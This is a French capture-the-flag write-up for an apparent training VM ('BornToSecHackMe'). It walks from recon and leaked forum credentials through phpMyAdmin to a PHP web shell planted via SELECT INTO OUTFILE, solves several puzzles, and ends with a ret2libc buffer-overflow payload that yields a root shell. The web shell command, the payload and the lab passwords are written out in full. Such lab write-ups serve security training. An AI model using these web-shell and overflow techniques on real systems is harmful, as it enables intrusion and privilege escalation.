### Partie 1

    #### Étape 1 - Scanner avec nmap :

        Scannez l'adresse IP locale avec nmap.

    #### Étape 2 - dirb :

        Scannez ensuite avec dirb pour trouver tous les chemins accessibles du site.

    #### Étape 3 - Forum :

        Après avoir trouvé tous les chemins accessibles, il y a plusieurs chemins disponibles : /forum, /phpmyadmin, /webmail.
        Parmi eux, seul /forum semble intéressant car les deux autres demandent des informations de connexion.
        Sur ce forum, on trouve différents posts, seul celui de "lmezard" retient notre attention car il contient toutes ses tentatives de connexion ssh. 
        Dans une ligne, il semble confondre son login et son mot de passe, donc le mot de passe est visible et nous pouvons 
        le tester pour essayer de se connecter à son compte.

    #### Étape 4 - Connexion au compte :

        En utilisant le nom d'utilisateur (lmezard) et le mot de passe (!q\]Ej?*5K5cy*AJ) trouvés dans ses logs partagés, 
        nous arrivons à nous connecter à son compte.

    #### Étape 5 - Tester le mot de passe ailleurs :

        En testant le mot de passe pour essayer de se connecter en ssh, phpmyadmin, webmail, cela ne fonctionne pas.

### Partie 2

    #### Étape 1 - Connexion au webmail :
        Après avoir essayé de se connecter sur webmail avec le login "lmezard", on parcourt les informations de compte de lmezard et on utilise son mail (laurie@borntosec.net) et le mot de passe (!q\]Ej?*5K5cy*AJ) récupéré précédemment, et on arrive à se connecter.

    #### Étape 2 - Consultation des mails :
        On a deux mails dans la boîte de réception. Dans l'un d'entre eux se trouve un message indiquant les identifiants pour se connecter à la base de données.

    #### Étape 3 - Connexion à la base de données :
        On se connecte à la base de données avec le login (root) et le mot de passe (Fg-'kKXBj87E:aJ$) récupérés dans la boîte mail.

### Partie 3

    #### Étape 1 - Exploiter la base de données :
        On accède à toute la base de données avec tous les privilèges.

    #### Étape 2 - Upload d'un fichier PHP :
        Lorsqu'on avait fait la commande dirb, plusieurs dossiers étaient accessibles et où potentiellement on pouvait uploader un fichier qu'on pourrait exécuter.

    #### Étape 3 - Vérification :
        On vérifie ces chemins avec cette commande `SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/forum/[chemins]/test.php'`. On voit que la commande fonctionne sur le chemin /forum/templates_c/.

    #### Étape 4 - Upload du script PHP :
        À partir d e cette étape, on décide d'uploader sur ce chemin notre script PHP qui nous permettra d'exécuter des commandes sur le serveur distant. Pour cela, on remplace `<?php phpinfo(); ?>` par `<?php system($_GET['cmd']) ?>` et [chemins] par le bon chemin. Commande : `SELECT "<?php system($_GET['cmd']) ?>" INTO OUTFILE "/var/www/forum/templates_c/test.php"`.

    #### Étape 5 - Accéder au fichier :
        On accède au fichier qu'on a uploadé sur ce chemin : https://192.168.56.104/forum/templates_c/test.php. On ajoute l'argument avec la commande à exécuter : https://192.168.56.104/forum/templates_c/test.php?cmd=ls.

        Ensuite, nous avons le résultat suivant dans notre navigateur :

        ```
        11c603a9070a9e1cbb42569c40699569e0a53f12.file.admin.inc.tpl.php
        2bd398249eb3f005dbae14690a7dd67b920a4385.file.login.inc.tpl.php
        40bf370f621e4a21516f806a52da816d70d613db.file.user.inc.tpl.php
        427dca884025438fd528481570ed37a00b14939c.file.ajax_preview.tpl.php
        560a32decccbae1a5f4aeb1b9de5bef4b3f2a9e5.file.posting.inc.tpl.php
        5cfe6060cd61c240ab9571e3dbb89827c6893eea.file.main.tpl.php
        749c74399509c1017fd789614be8fc686bbfc981.file.user_edit.inc.tpl.php
        8e2360743d8fd2dec4d073e8a0541dbe322a9482.english.lang.config.php
        ad5c544b74f3fd21e6cf286e36ee1b2d24a746b9.file.user_profile.inc.tpl.php
        b2b306105b3842dc920a1d11c8bb367b28290c2a.file.subnavigation_1.inc.tpl.php
        d0af1f95d9c68edf1f8805f6009e021a113a569a.file.entry.inc.tpl.php
        e9c93976b632dda2b9bf7d2a686f72654e73a241.file.user_edit_email.inc.tpl.php
        f13dc3b8bcb4f22c2bd24171219c43f5555f95c0.file.index.inc.tpl.php
        f75851d3a324a67471c104f30409f32a790c330e.file.subnavigation_2.inc.tpl.php
        test.php
        ```

    #### Étape 6 - Fouiller dans les dossiers :
        Après avoir fouillé dans les fichiers, dans le dossier /home on tombe sur le dossier LOOKATME où on trouve le fichier password. 
        On fait la commande cat dessus et on tombe sur les infos suivantes lmezard:G!@M6f4Eatau{sF".

    #### Étape 7 - Tester le mot de passe :
        On teste ces identifiants sur le ssh mais cela ne fonctionne pas. On teste après sur ftp et cela semble fonctionner.

    #### Étape 8 - Exporter les fichiers via ftp :
        On se connecte en ftp au serveur via un terminal. Depuis la connexion ftp, on accède à un seul dossier dans lequel se trouvent deux fichiers :

        ```
        -rwxr-x--- 1 1001 1001 96 Oct 15 2015 README
        -rwxr-x--- 1 1001 1001 808960 Oct 08 2015 fun
        ```

        On copie ces deux fichiers sur notre machine locale avec la commande 'get'.

    #### Étape 9 - Analyse du fichier :
        Le README contient la phrase suivante : "Complete this little challenge and use the result as password for user 'laurie' to login in ssh". Ce qui veut dire que le fichier fun contient le mot de passe. Quand on ouvre le fichier fun, il semble contenir une immense quantité de texte incompréhensible parmi lequel on trouve ceci qui ressemble à un programme C :

        ```
        int main() {
            printf("M");
            printf("Y");
            printf(" ");
            printf("P");
            printf("A");
            printf("S");
            printf("S");
            printf("W");
            printf("O");
            printf("R");
            printf("D");
            printf(" ");
            printf("I");
            printf("S");
            printf(":");
            printf(" ");
            printf("%c",getme1());
            printf("%c",getme2());
            printf("%c",getme3());
            printf("%c",getme4());
            printf("%c",getme5());
            printf("%c",getme6());
            printf("%c",getme7());
            printf("%c",getme8()); 
            printf("%c",getme9()); 
            printf("%c",getme10()); 
            printf("%c",getme11()); 
            printf("%c",getme12()); 
            printf("\n");
            printf("Now SHA-256 it and submit");
        }
        ```

        En analysant encore le fichier, on trouve les valeurs de retour de certains getme :

        ```
        char getme8() {
            return 'w';
        }
        char getme9() {
            return 'n';
        }
        char getme10() {
            return 'a';
        }
        char getme11() {
            return 'g';
        }
        char getme12() {
            return 'e';
        }
        ```

        Mais il nous manque toujours les getme1 à getme7. Je les retrouve dans le fichier mais leur valeur de retour n'est pas visible. Par contre, on voit que dans chaque fichier il y a un commentaire avec le numéro de ce dernier : //file1. Donc il faut extraire le contenu de chaque fichier et récupérer le contenu dans l'ordre croissant pour avoir le résultat.

        Après avoir récupéré tout le code du programme C, on trouve les valeurs de retour et on arrive à notre mot de passe : Iheartpwnage. Ensuite, on fait un sha256sum sur le mot de passe : `echo -n "Iheartpwnage" | sha256sum` qui donne :

        ```
        330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
        ```

        Avec ce mot de passe et le login laurie, on arrive à se connecter en ssh.

### Partie 4

    #### Étape 1 - Repérage :
        Il y a deux fichiers sur la session de laurie : README et bombe. Voici le contenu de README :

        ```
        When you have all the passwords, use it as "thor" user with ssh.

        HINT:
        P
        2
        b
        o
        4
        ```
        phase 1 : 
            Public speaking is very easy.
        phase 2 :
            1 2 6 24 120 720
            Pour éviter que explode_bomb soit appelée, les six nombres doivent suivre ces règles :
            Le premier nombre (aiStack_20[1]) doit être 1.
            Chaque nombre suivant doit être le produit de son indice (commençant à 2) et du nombre précédent.
            Décrivons ces valeurs pas à pas :
            aiStack_20[1] = 1
            aiStack_20[2] = 2 * aiStack_20[1] = 2 * 1 = 2
            aiStack_20[3] = 3 * aiStack_20[2] = 3 * 2 = 6
            aiStack_20[4] = 4 * aiStack_20[3] = 4 * 6 = 24
            aiStack_20[5] = 5 * aiStack_20[4] = 5 * 24 = 120
            aiStack_20[6] = 6 * aiStack_20[5] = 6 * 120 = 720
            Donc, la séquence de valeurs correcte pour param_1 doit être : 1 2 6 24 120 720.
        phase 3 :
            0 q 777
            2 b 755
            1 b 214 
        phase 4 : 
            9 (fibonacci)
        phase 5 :
            opekmq
        phase 6 :
            4 2 6 3 1 5

        Le mot de passe complet : Publicspeakingisveryeasy.126241207201b2149opekmq426135


### Partie 5

    #### Étape 1 - Session thor :

        Après s'être connecté à la session de thor, on a deux fichiers : README et turtle. 
        Le README nous indique que turtle contient le mot de passe. 
        Le fichier turtle contient des instructions de direction. 
        Nous avons utilisé un script Turtle pour suivre les instructions et dessiner le mot "SLASH". 
        À la fin du fichier d'instructions, il était indiqué que nous devions générer un hachage MD5 (Message Digest) de "SLASH". 
        Le résultat de ce hachage nous a donné le mot de passe pour le login de l'utilisateur zaz. 
        Voici les nouveaux identifiants de zaz : `646da671ca01bb5d84dbb5fb2238dc8e`.

### Partie 5

    #### Étape 1 - Session zaz :

        Sur cette session, on trouve un dossier mail et un fichier exploit_me. Après avoir ouvert le fichier exploit_me avec ghidra, 
        on voit qu'il s'agit d'un simple code qui vérifie d'abord si le nombre d'arguments passés (param_1) est supérieur à 1. 
        Si c'est le cas, il copie la chaîne pointée par le deuxième argument (param_2 + 4) dans un tableau local de 140 caractères (local_90) en 
        utilisant strcpy, puis affiche cette chaîne avec puts. Le programme retourne true si le nombre d'arguments est inférieur à 2,
        sinon il retourne false. On note que le code est vulnérable aux débordements de tampon car 
        strcpy ne vérifie pas la taille de la chaîne source et c'est ce fait qu'on va exploiter.

        On sait que le programme segfault quand on lui envoie une chaîne de caractères de 140 caractères. 
        Pour commencer, j'ai utilisé GDB (GNU Debugger) pour analyser et exploiter le programme exploit_me. 
        Voici le processus étape par étape :

        #### Première étape - Déclenchement du crash :
            ```
            (gdb) run $(python -c 'print "a" * 140')
            ```
            Cette commande lance le programme exploit_me avec un argument généré par Python, consistant en 140 caractères 'a'. L'objectif ici est de provoquer un dépassement de tampon (buffer overflow) pour perturber le comportement normal du programme.

            ```
            Starting program: /home/zaz/exploit_me $(python -c 'print "a" * 140')
            aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
            Program received signal SIGILL, Illegal instruction.
            0xb7e45400 in __libc_start_main () from /lib/i386-linux-gnu/libc.so.6
            ```

            Le programme s'arrête avec un signal SIGILL (instruction illégale), indiquant qu'il a rencontré une instruction inattendue en raison du dépassement de tampon.

        #### Deuxième étape - Recherche de références :

            ```
            (gdb) find __libc_start_main,+99999999,"/bin/sh"
            0xb7f8cc58
            warning: Unable to access target memory at 0xb7fd3160, halting search.
            1 pattern found.
            ```
            Ici, j'ai utilisé GDB pour rechercher l'adresse mémoire de la fonction __libc_start_main, qui fait partie de la libc (bibliothèque C standard). L'adresse 0xb7f8cc58 est trouvée et notée, car elle pourrait être utile pour notre prochaine étape d'exploitation.

        #### Troisième étape - Identification de la fonction system :

            ```
            (gdb) p system
            $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
            ```
            En utilisant GDB, j'ai obtenu l'adresse mémoire de la fonction system dans la libc, qui est 0xb7e6b060. Cette fonction system est cruciale car elle nous permet d'exécuter des commandes système.

        #### Quatrième étape - Assemblage du payload :
            ```
            ./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7')"`
            ```
            Enfin, j'ai construit le payload en utilisant les informations obtenues précédemment :
            - 140 * 'A' pour remplir le tampon et provoquer le dépassement de tampon.
            - `\x60\xb0\xe6\xb7` est l'adresse de la fonction system obtenue précédemment.
            - 'AAAA' est utilisé comme espace réservé pour remplacer par une éventuelle adresse de retour.
            - `\x58\xcc\xf8\xb7` est l'adresse de la chaîne "/bin/sh" dans la mémoire.

            Ce payload est conçu pour exploiter la vulnérabilité de dépassement de tampon dans exploit_me, en écrasant le pointeur de retour avec l'adresse de system et en plaçant "/bin/sh" comme argument pour system, permettant ainsi l'exécution d'un shell.

            ```
            zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7')"`
            AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��AAAAX���
            # whoami
            root
            # 
            ```